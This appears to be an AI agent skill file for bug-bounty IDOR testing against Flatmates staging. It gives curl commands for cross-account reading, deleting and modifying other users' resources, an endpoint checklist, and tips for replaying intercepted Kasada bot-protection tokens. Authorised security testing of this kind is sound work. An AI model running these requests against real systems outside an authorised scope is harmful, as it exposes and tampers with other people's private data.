---
name: idor-tester
description: Systematically execute IDOR and access control tests on a target using two authenticated accounts. Use after hypothesis-agent has generated hypotheses, or any time you have a list of endpoints/resources and two active sessions. Trigger on phrases like "test IDOR", "cross-account test", "test access control", "verify IDOR hypothesis", "check if A can access B's resource", or any time you have two accounts and want to test whether one can access the other's data.
allowed-tools: Bash
---

# IDOR Tester

Target: $ARGUMENTS

All commands run directly in Kali WSL. No SSH.
Two authenticated accounts are required. This skill does NOT set them up — confirm sessions are active before starting.

---

## Hard Stop Rules (read before every test)

Do not test any of the following:

- Out-of-scope assets
- Destructive operations (delete real user data, send real messages to real users)
- Production accounts if only staging is in scope

Do not mark something as a confirmed finding unless:
1. A1 receives a **200/201/204** accessing A2's resource (not 401, 403, 404, or 422)
2. The response body contains **A2's actual data** (not an empty response, not A1's own data)
3. The operation is **reproducible** — you confirmed it twice

---

## Step 0 — Load Context

```bash
export PATH=$PATH:~/go/bin
cat ~/bugbounty/knowledge/weak-patterns.md 2>/dev/null || echo "No weak patterns yet"
cat ~/bugbounty/knowledge/recon-noise.md 2>/dev/null || echo "No recon noise yet"
```

Read all hypothesis files in the target directory:

```bash
find "$ARGUMENTS" -name "*.md" -o -name "*.txt" | xargs grep -l -i "idor\|access control\|cross-user\|cross-account\|shortlist\|booking\|payment\|profile\|ownership" 2>/dev/null | head -10
```

Read each matched file. Extract the list of IDOR hypotheses to test.

---

## Step 1 — Confirm Session State

Before running any tests, confirm both accounts are active. Ask the user to provide:

- **A1 (attacker)**: `_flatmates_session` / Bearer token / session cookie + member ID / user ID
- **A2 (victim)**: same

Confirm both sessions respond 200 on an authenticated endpoint:

```bash
# Adjust endpoint and auth header to match the target
curl -s -o /dev/null -w "%{http_code}" \
  -H "Cookie: _session=A1_SESSION" \
  -H "bugcrowd-id: cnsecconsultingptyltd@gmail.com" \
  -H "flatmates-bugcrowd: E277D811-7BE0-4DC1-BDF8-C3B9394E5C69" \
  "https://TARGET/api/me"
```

If either session returns 401 — stop. Do not test with expired sessions. Ask the user to re-authenticate.

**For Flatmates staging specifically:**
- Session cookie: `_flatmates_session`
- Required headers: `bugcrowd-id: cnsecconsultingptyltd@gmail.com` + `flatmates-bugcrowd: E277D811-7BE0-4DC1-BDF8-C3B9394E5C69`
- CSRF token: parse from `<meta name="csrf-token">` in any page response, or from `context.session.csrf.token` in `data-react-props` HTML attribute
- Confirm: GET `/my_account` with `Accept: application/json` → should return 200 with member JSON

---

## Step 2 — Enumerate A2's Resources

For each resource type relevant to the hypotheses, use A2's session to create or enumerate resources and collect their IDs. Record all IDs to test.

```bash
mkdir -p "$ARGUMENTS/idor-test"
```

For Flatmates-type targets, the key resource types and their API paths:

| Resource | Create | Enumerate | Delete |
|---|---|---|---|
| Shortlist | POST /shortlists | GET /shortlists (SPA only — parse React props or 201 response) | DELETE /shortlists/{id} |
| Saved search | POST /saved_search | GET /api/user_searches?search_types[]=saved_search | DELETE /saved_search/{id} |
| Inspection booking | POST /inspections/bookings | GET /inspections/bookings | DELETE /inspections/bookings/{id} |
| Profile | auto (from registration) | GET /api/me | PATCH /api/people/{id} |
| Property listing | POST /rooms (multi-step) | GET /api/properties/{id} | POST /api/listings/deactivate |
| Payment interaction | created by payment flow | GET /payment_interactions/{id} | N/A |
| Conversation | POST /conversations/create | GET /conversations | read: GET /conversations/{id} |

**Getting a CSRF token for POST requests:**
```bash
# Fetch a page and extract the CSRF token from meta tag
curl -s \
  -H "Cookie: _flatmates_session=A2_SESSION" \
  -H "bugcrowd-id: cnsecconsultingptyltd@gmail.com" \
  -H "flatmates-bugcrowd: E277D811-7BE0-4DC1-BDF8-C3B9394E5C69" \
  "https://next.flatmates.com.au/" | grep -o '<meta name="csrf-token" content="[^"]*"' | grep -o 'content="[^"]*"' | cut -d'"' -f2
```

**Note:** Flatmates POST endpoints that require Kpsdk bot protection headers cannot be called from curl without a solved challenge. Use Burp Repeater or the browser for those. Endpoints known to require Kpsdk: `/shortlists`, `/conversations/create`. Endpoints that do NOT require Kpsdk: `/api/listings/deactivate`, `/saved_search` (GET), `/api/user_searches`.

---

## Step 3 — Run IDOR Tests (A1 attacks A2's resources)

For each resource ID collected in Step 2, run the cross-account test. Use A1's session token for all requests in this step.

### 3a. Read IDOR (can A1 read A2's private data?)

```bash
# Example: read A2's profile with A1's session
curl -s -w "\n%{http_code}" \
  -H "Cookie: _flatmates_session=A1_SESSION" \
  -H "Accept: application/json" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "bugcrowd-id: cnsecconsultingptyltd@gmail.com" \
  -H "flatmates-bugcrowd: E277D811-7BE0-4DC1-BDF8-C3B9394E5C69" \
  "https://next.flatmates.com.au/api/people/A2_MEMBER_ID"
```

**Pass criteria:** 200 response with A2's private fields (email, mobile, payment data).

### 3b. Delete IDOR (can A1 delete A2's resource?)

```bash
curl -s -w "\n%{http_code}" -X DELETE \
  -H "Cookie: _flatmates_session=A1_SESSION" \
  -H "Accept: application/json" \
  -H "X-Csrf-Token: A1_CSRF_TOKEN" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "bugcrowd-id: cnsecconsultingptyltd@gmail.com" \
  -H "flatmates-bugcrowd: E277D811-7BE0-4DC1-BDF8-C3B9394E5C69" \
  "https://next.flatmates.com.au/shortlists/A2_SHORTLIST_ID"
```

**Pass criteria:** 200 or 204 response. Confirm deletion by verifying the resource no longer appears in A2's session.

### 3c. Modify IDOR (can A1 modify A2's resource?)

```bash
curl -s -w "\n%{http_code}" -X PATCH \
  -H "Cookie: _flatmates_session=A1_SESSION" \
  -H "Accept: application/json" \
  -H "Content-Type: application/json" \
  -H "X-Csrf-Token: A1_CSRF_TOKEN" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "bugcrowd-id: cnsecconsultingptyltd@gmail.com" \
  -H "flatmates-bugcrowd: E277D811-7BE0-4DC1-BDF8-C3B9394E5C69" \
  -d '{"name":"IDOR_TEST"}' \
  "https://next.flatmates.com.au/api/people/A2_MEMBER_ID"
```

**Pass criteria:** 200 response and the field is actually changed (verify with A2's session).

### 3d. Horizontal escalation via parameter substitution

For endpoints that take a user ID in the request body (not just URL):

```bash
# Example: booking confirmation where userId is in the body
curl -s -w "\n%{http_code}" -X POST \
  -H "Cookie: _flatmates_session=A1_SESSION" \
  -H "Accept: application/json" \
  -H "Content-Type: application/json" \
  -H "X-Csrf-Token: A1_CSRF_TOKEN" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "bugcrowd-id: cnsecconsultingptyltd@gmail.com" \
  -H "flatmates-bugcrowd: E277D811-7BE0-4DC1-BDF8-C3B9394E5C69" \
  -d '{"userId":"A2_MEMBER_ID","bookingId":"BOOKING_ID"}' \
  "https://TARGET/api/confirm_booking"
```

**Pass criteria:** 200 response with A2's booking data processed under A1's credentials.

---

## Step 4 — Verify and Confirm

For any test that returned a passing status code, do two things immediately:

1. **Confirm data belongs to A2, not A1:**
```bash
# Re-fetch the resource with A2's session and confirm it's missing/modified
curl -s -w "\n%{http_code}" \
  -H "Cookie: _flatmates_session=A2_SESSION" \
  -H "Accept: application/json" \
  -H "bugcrowd-id: cnsecconsultingptyltd@gmail.com" \
  -H "flatmates-bugcrowd: E277D811-7BE0-4DC1-BDF8-C3B9394E5C69" \
  "https://TARGET/RESOURCE/A2_ID"
```

2. **Repeat the attack from scratch** — re-create A2's resource, re-run the A1 attack — confirm it's reproducible.

Only after both confirmations: log this as a finding.

---

## Step 5 — Document Findings

For each confirmed finding, write to `~/bugbounty/$ARGUMENTS/findings/`:

```bash
mkdir -p ~/bugbounty/"$ARGUMENTS"/findings
cat > ~/bugbounty/"$ARGUMENTS"/findings/IDOR-$(date +%Y%m%d-%H%M)-RESOURCE_TYPE.md << 'EOF'
# IDOR — [Resource Type] — [HTTP Method]

**Date:** YYYY-MM-DD
**Target:** https://TARGET
**Severity estimate:** [Medium / High / Critical]

## Summary
[One sentence: A1 (member X) can [read/modify/delete] A2 (member Y)'s [resource] via [endpoint]]

## Reproduction

**A2 creates resource:**
```
POST /resource HTTP/1.1
Host: target
Cookie: [A2 session]
[request body]
---
HTTP/1.1 201 Created
{"id": RESOURCE_ID}
```

**A1 attacks resource:**
```
DELETE /resource/RESOURCE_ID HTTP/1.1
Host: target  
Cookie: [A1 session]
---
HTTP/1.1 204 No Content
```

**A2 confirms resource is gone:**
```
GET /resource/RESOURCE_ID HTTP/1.1
Cookie: [A2 session]
---
HTTP/1.1 404 Not Found
```

## Impact
[What data is exposed / what operation is unauthorized / business impact]

## Notes
[Anything about scope, Kasada bypass, CSRF requirements, etc.]
EOF
```

---

## Step 6 — Feed Confirmed Findings to Triager

For each finding in `~/bugbounty/$ARGUMENTS/findings/`, run `/triager` on it before considering submission.

Log weak tests (401/403/404 responses) to knowledge base:

```bash
cat >> ~/bugbounty/knowledge/weak-patterns.md << EOF

## $(date +%Y-%m-%d) — Confirmed protected: [endpoint] on [target]
**Result:** 401/403 — server properly scopes to authenticated user
**Pattern:** IDOR attempt on [resource type]
**Lesson:** [target] enforces ownership checks on [endpoint]
EOF
```

---

## Checklist: Common Flatmates IDOR Surfaces

Work through each. Check off confirmed-safe or confirmed-vulnerable:

- [ ] `DELETE /shortlists/{id}` — can A1 delete A2's shortlist?
- [ ] `DELETE /saved_search/{id}` — can A1 delete A2's saved search?
- [ ] `GET /payment_interactions/{id}` — can A1 read A2's payment records?
- [ ] `PATCH /api/people/{id}` — can A1 modify A2's profile fields?
- [ ] `GET /inspections/bookings/{id}` — can A1 read A2's inspection booking?
- [ ] `DELETE /inspections/bookings/{id}` — can A1 cancel A2's booking?
- [ ] `POST /api/listings/deactivate` with A2's listing ID — can A1 deactivate A2's listing?
- [ ] `GET /api/me/deactivations` — does this ever leak other users' deactivation history?
- [ ] `POST /conversations/create` with A2's member ID — can A1 impersonate A2 as sender?

---

## Notes on Kasada / Akamai Protection

Flatmates staging (`next.flatmates.com.au`) requires Kasada challenge headers for POST endpoints:
- `X-Kpsdk-Ct`, `X-Kpsdk-H`, `X-Kpsdk-V`, `X-Kpsdk-Cd`

These cannot be forged from curl. For POST endpoints that require Kasada:
1. Use Burp Suite browser (which sends these automatically after challenge solve)
2. OR intercept a valid challenge from the browser and replay within its TTL (seconds)
3. OR focus testing on GET and DELETE endpoints (which often do not require Kasada)

GET and authenticated-only endpoints generally do NOT require Kasada challenge headers.
